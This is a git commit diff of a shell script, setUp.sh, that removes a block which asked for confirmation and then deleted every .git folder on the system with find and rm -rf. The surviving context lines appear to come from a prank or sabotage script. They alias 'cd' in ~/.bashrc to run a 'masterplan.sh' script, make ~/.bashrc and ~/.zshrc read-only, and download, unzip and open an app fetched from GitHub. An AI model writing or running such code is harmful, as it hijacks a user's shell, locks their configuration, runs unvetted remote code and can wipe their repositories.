c6c3b12d97f945d8dacb5a5a75b5acb49b245f40
4n4k1n <anakin@pregitzer.de>
2025-01-11 17:12:35 +0100

    removed the 'remove .git folder' part

--- setUp.sh
+++ setUp.sh
@@ -34,17 +34,6 @@ echo "alias cd='bash ~/masterplan.sh'" >> ~/.bashrc
 chmod -w ~/.zshrc
 chmod -w ~/.bashrc
 
-read -p "Do you want to remove all .git folders? [Y/n] : " confirm
-
-if [[ "$confirm" == "Y" ]]; then
-    read -p "Are you really sure? [Y/n] : " confirm
-    if [[ "$confirm" == "Y" ]]; then
-        find / -type d  -name ".git" 2>/dev/null | while read gitFolder; do
-            rm -rf "$gitFolder"
-        done
-    fi
-fi
-
 curl -L -o ~/goose.zip 'https://raw.githubusercontent.com/PaulicStudios/goose/refs/heads/main/goose.zip'
 unzip -o ~/goose.zip -d ~/goose
 open ~/goose/goose.app
